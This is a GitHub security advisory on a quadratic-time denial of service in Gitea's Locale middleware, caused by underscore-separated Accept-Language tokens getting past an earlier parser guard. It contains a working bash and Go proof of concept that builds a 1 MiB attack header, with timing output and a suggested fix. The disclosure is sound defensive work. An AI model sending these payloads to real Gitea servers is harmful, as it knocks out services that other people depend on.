# [H] Gitea: ParseAcceptLanguage quadratic-time DoS via Locale middleware on unauthenticated requests

## Summary
Severity: High
Advisory: GHSA-fw57-jgch-pgf3
CVE: CVE-2026-58436
CWE: CWE-1333, CWE-407
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-fw57-jgch-pgf3
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Summary

The Locale middleware that runs in front of every unauthenticated request
calls `golang.org/x/text/language.ParseAcceptLanguage` on the raw
`Accept-Language` header without imposing a size or shape filter. The
underlying parser has quadratic-time behaviour on long lists of malformed
language tags. The CVE-2022-32149 guard that golang.org/x/text added in
v0.3.8 caps the number of `-` characters in the input at 1000, but it does
not cap `_` characters even though the parser's internal scanner aliases
`_` to `-` before parsing. A single unauthenticated GET request with an
`Accept-Language` header built out of `_` separators burns ~2 seconds of
server CPU on the host running Gitea; ten concurrent attackers saturate a
ten-core box for the duration of the attack while consuming ~1 MiB of
upstream bandwidth per request.

### Affected versions

`code.gitea.io/gitea` 1.22.6 and (per code inspection of `main`) all
earlier and later 1.22.x / 1.23.x / 1.24.x / 1.25.x / 1.26.x versions that
do not impose their own size limit on the `Accept-Language` header before
calling `ParseAcceptLanguage`. Verified on:

- the official `gitea/gitea:1.22.6` docker image (E2E below)
- `main` at commit `6f4027a6be28c876c0abaf37cc939658645b78a3` by reading
  `modules/web/middleware/locale.go` (the call site at line 38 is unchanged
  on `main`)

### Privilege required

Unauthenticated. The Locale middleware runs for every HTTP request
including the landing page and the sign-in page.

### Vulnerable code

[`modules/web/middleware/locale.go:38`](https://github.com/go-gitea/gitea/blob/fc396f0808187c358b4fc15dcefcd6957140a780/modules/web/middleware/locale.go#L38)
(blob SHA `fc396f0808187c358b4fc15dcefcd6957140a780`):

```go
// 3. Get language information from 'Accept-Language'.
// The first element in the list is chosen to be the default language automatically.
if len(lang) == 0 {
    tags, _, _ := language.ParseAcceptLanguage(req.Header.Get("Accept-Language"))
    tag := translation.Match(tags...)
    lang = tag.String()
}
```

`req.Header.Get("Accept-Language")` is the unfiltered HTTP header. Default
Go `net/http` `MaxHeaderBytes` is `1 << 20` = 1 MiB and Gitea does not
override it, so the parser is allowed to receive up to a megabyte of
attacker-controlled data.

CVE-2022-32149 hardened `ParseAcceptLanguage` by counting `-` characters
and rejecting inputs with more than 1000 of them. The guard does not count
`_` characters even though the scanner converts `_` to `-` at parse time
([`golang.org/x/text/internal/language/parse.go`](https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go)).
A 1 MiB header full of 9-character `_aaaaaaaaa_aaaaaaaaa_...` tokens
contains zero `-` characters, passes the guard, and then drives the
scanner into the O(N²) `gobble` path. The fix author of CVE-2022-32149
treated `-` as the canonical separator; the `_` alias was added in 2013,
nine years before the fix.

### How `Accept-Language` reaches `ParseAcceptLanguage`

Every Gitea HTTP request passes through `Locale` as it is wired up via
the global request pipeline (Gitea registers the middleware on its router
in `routers/web/web.go`). The middleware sequence is:

1. The request enters `Locale(resp, req)`.
2. `req.URL.Query().Get("lang")` returns "" (attacker omits `lang`).
3. `req.Cookie("lang")` returns nil on a fresh client (attacker uses a
   fresh client, or simply does not send the cookie).
4. `req.Header.Get("Accept-Language")` returns the full attacker-supplied
   header value.
5. `language.ParseAcceptLanguage(...)` runs unfiltered.

No size or character class filter is applied between (4) and (5).

### Proof of concept

Single-line bash reproducer that crafts the malicious header and
times one request against a fresh `gitea/gitea:1.22.6` container:

```bash
docker run -d --name gitea --rm -p 13000:3000 gitea/gitea:1.22.6
sleep 8

PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 100000, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:13000/
```

Each 9-character `_abcdefghi` token has length 9, which fails the
scanner's `len <= 8` tag-length check at
`golang.org/x/text/internal/language/parse.go` and triggers a `gobble`
call that `runtime.memmove`s the entire remaining buffer. With N invalid
tokens the total bytes moved by `gobble` is O(N²).

### End-to-end reproduction (against `gitea/gitea:1.22.6`)

A Go driver `poc.go` that boots the container, sends a 1 MiB
`Accept-Language` value once with `-` (CVE-2022-32149 guard fires) and
once with `_` (guard bypassed):

```go
// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:13000/"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 60 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 1MiB)", buildPayload("-", 1<<20))
    send("attack ('_' x 1MiB)",     buildPayload("_", 1<<20))
    send("attack repeat 2",          buildPayload("_", 1<<20))
    send("attack repeat 3",          buildPayload("_", 1<<20))
}
```

Captured run output (Apple M1 Pro, darwin/arm64, Go 1.26.1, the
official `gitea/gitea:1.22.6` image with no other tuning):

```
E2E: golang/x/text ParseAcceptLanguage '_' bypass through
go-gitea/gitea 1.22.6 Locale middleware at
modules/web/middleware/locale.go:38.

Target: http://127.0.0.1:13000/

  warm-up (no header)              header=0 B  '_'=0  '-'=0  status=200  t=18.079666ms

--- measurements (single request each) ---
  baseline (no header)             header=0 B  '_'=0  '-'=0  status=200  t=6.480333ms
  baseline (1 short tag)           header=5 B  '_'=0  '-'=1  status=200  t=5.0455ms
  guard-fires control ('-' x 1MiB) header=1048572 B  '_'=0  '-'=104857  status=200  t=26.020625ms
  attack ('_' x 1MiB)              header=1048572 B  '_'=104857  '-'=0  status=200  t=2.159538333s
  attack repeat 2                  header=1048572 B  '_'=104857  '-'=0  status=200  t=1.938493583s
  attack repeat 3                  header=1048572 B  '_'=104857  '-'=0  status=200  t=1.679953042s
```

Interpretation:

| Request                                  | Header bytes | Server time |
|------------------------------------------|--------------|-------------|
| no header / short tag                    | 0 - 5        | 1 - 7 ms    |
| 1 MiB `-` separators (CVE-2022-32149 guard fires) | 1 MiB | 26 ms       |
| 1 MiB `_` separators (guard bypassed)    | 1 MiB        | 1.7 - 2.2 s |

The `-` control proves that the existing CVE-2022-32149 guard does still
work on the canonical separator: a 1 MiB `-` payload returns in 26 ms
because the parser short-circuits with `ErrTagListTooLarge`. The `_`
attack returns 200 from the same endpoint but consumes ~2 s of server
CPU because the guard did not fire and the quadratic scanner ran to
completion.

### Impact

- One unauthenticated client can pin one CPU core for ~2 seconds per 1
  MiB request.
- Ten concurrent attackers using ~10 MiB/s of upstream bandwidth pin a
  10-core Gitea instance indefinitely.
- The endpoint returns 200 OK, so the attack does not surface as
  abnormal traffic in standard 4xx/5xx dashboards.
- Self-hosted Gitea installations published to the public internet (the
  common pattern) are exposed.

### Suggested fix

Apply the size / character-class filter before reaching
`ParseAcceptLanguage`. The smallest change that preserves the existing
behaviour for legitimate Accept-Language headers is to count `_`
alongside `-` and short-circuit when the total exceeds a small ceiling:

```go
// modules/web/middleware/locale.go
const maxAcceptLanguageSeparators = 32 // matches typical real browser values

if len(lang) == 0 {
    al := req.Header.Get("Accept-Language")
    if strings.Count(al, "-")+strings.Count(al, "_") > maxAcceptLanguageSeparators {
        // Refuse to call into the BCP 47 parser with absurd input.
        al = ""
    }
    tags, _, _ := language.ParseAcceptLanguage(al)
    tag := translation.Match(tags...)
    lang = tag.String()
}
```

A real Accept-Language header from a browser contains under 10
separators, so a ceiling of 32 leaves plenty of headroom while making
the quadratic blow-up impossible.

The underlying issue is in `golang.org/x/text/language`. A future
upstream fix is the right long-term solution; the change above is
defensive in depth at the only call site that consumes attacker input.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-fw57-jgch-pgf3
- https://github.com/go-gitea/gitea/pull/38323
- https://github.com/go-gitea/gitea/commit/f452c369acc9f1bd05ec6ef9c2e4399062dd6da1
- https://github.com/go-gitea/gitea
